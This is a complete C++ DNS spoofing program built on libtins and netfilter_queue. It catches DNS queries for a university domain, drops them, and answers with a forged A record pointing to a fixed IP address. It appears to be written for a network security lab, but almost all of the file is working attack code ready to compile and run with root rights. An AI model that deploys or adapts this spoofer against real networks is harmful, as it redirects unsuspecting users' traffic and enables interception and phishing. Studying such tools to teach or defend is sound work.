// Compile with: g++ -Wall -Wextra -std=c++17 -o dns_spoof dns_spoof.cpp -lnetfilter_queue -ltins
// Run with: sudo ./dns_spoof
#include <iostream>
#include <tins/tins.h>
#include <libnetfilter_queue/libnetfilter_queue.h>
#include <linux/netfilter.h>
#include <cstring>

using namespace Tins;
using namespace std;

const string target_domain = "www.nycu.edu.tw";
const string fake_ip = "140.113.24.241";

void send_spoofed_response(const IP& original_ip, const UDP& udp, const DNS& dns) {
    try {
        DNS response;
        response.id(dns.id());
        response.type(DNS::RESPONSE);
        response.add_query(dns.queries().front());

        DNS::resource answer;
        answer.dname(target_domain);
        answer.query_type(DNS::A);
        answer.query_class(DNS::IN);
        answer.ttl(300);
        answer.data(fake_ip);
        response.add_answer(answer);

        UDP spoofed_udp(53, udp.sport());
        spoofed_udp /= response;

        IP spoofed_ip(original_ip.dst_addr(), original_ip.src_addr());
        spoofed_ip /= spoofed_udp;

        PacketSender sender;
        sender.send(spoofed_ip);

        cout << "[+] Spoofed DNS reply sent to " << spoofed_ip.dst_addr() << endl;
    } catch (const exception& e) {
        cerr << "[-] Failed to send spoofed response: " << e.what() << endl;
    }
}

static int packet_callback(struct nfq_q_handle* qh, struct nfgenmsg*,
                           struct nfq_data* nfa, void*) {
    struct nfqnl_msg_packet_hdr* ph = nfq_get_msg_packet_hdr(nfa);
    if (!ph) {
        cerr << "[-] Packet header missing, skipping..." << endl;
        return nfq_set_verdict(qh, 0, NF_ACCEPT, 0, nullptr);
    }

    uint32_t id = ntohl(ph->packet_id);
    unsigned char* data = nullptr;
    int len = nfq_get_payload(nfa, &data);

    if (len < 0 || !data) {
        cerr << "[-] Failed to get payload, skipping..." << endl;
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
    }

    try {
        IP pkt(data, len);
        const UDP* udp = pkt.find_pdu<UDP>();
        if (!udp || udp->dport() != 53) {
            return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
        }

        const RawPDU* raw = udp->find_pdu<RawPDU>();
        if (!raw) {
            cerr << "[-] No RawPDU found in UDP, skipping..." << endl;
            return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
        }

        const auto& payload = raw->payload();
        if (payload.size() < 12) {  // DNS header is at least 12 bytes
            cerr << "[-] RawPDU too small for DNS" << endl;
            return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
        }

        DNS dns(payload.data(), payload.size());
        if (dns.type() != DNS::QUERY || dns.queries().empty()) {
            return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
        }

        // Store queries to avoid dangling reference
        auto queries = dns.queries();
        const DNS::query& query = queries.front();
        cout << "[*] DNS query for: " << query.dname() << endl;

        if (query.dname() == target_domain) {
            send_spoofed_response(pkt, *udp, dns);
            return nfq_set_verdict(qh, id, NF_DROP, 0, nullptr);
        }

    } catch (const exception& e) {
        cerr << "[-] Exception while processing packet: " << e.what() << endl;
    }

    cout << "[+] Packet processed normally" << endl;
    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
}

int main() {
    struct nfq_handle* h = nfq_open();
    if (!h) {
        cerr << "[-] Failed to open NetfilterQueue" << endl;
        return 1;
    }

    nfq_unbind_pf(h, AF_INET);
    nfq_bind_pf(h, AF_INET);

    struct nfq_q_handle* qh = nfq_create_queue(h, 0, &packet_callback, nullptr);
    if (!qh) {
        cerr << "[-] Failed to create queue" << endl;
        nfq_close(h);
        return 1;
    }

    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
        cerr << "[-] Failed to set mode" << endl;
        nfq_destroy_queue(qh);
        nfq_close(h);
        return 1;
    }

    int fd = nfq_fd(h);
    char buf[4096] __attribute__((aligned));

    cout << "[*] Listening for DNS packets..." << endl;

    while (true) {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(fd, &fds);

        timeval tv = {1, 0};  // 1-second timeout
        int ret = select(fd + 1, &fds, nullptr, nullptr, &tv);

        if (ret < 0) {
            if (errno == EINTR) continue;
            cerr << "[-] select() error: " << strerror(errno) << endl;
            break;
        }

        if (FD_ISSET(fd, &fds)) {
            int rv = recv(fd, buf, sizeof(buf), 0);
            if (rv >= 0) {
                nfq_handle_packet(h, buf, rv);
            } else if (errno != ENOBUFS) {
                cerr << "[-] recv() error: " << strerror(errno) << endl;
                break;
            }
        }
    }

    cout << "[*] Cleaning up..." << endl;
    nfq_destroy_queue(qh);
    nfq_close(h);
    return 0;
}
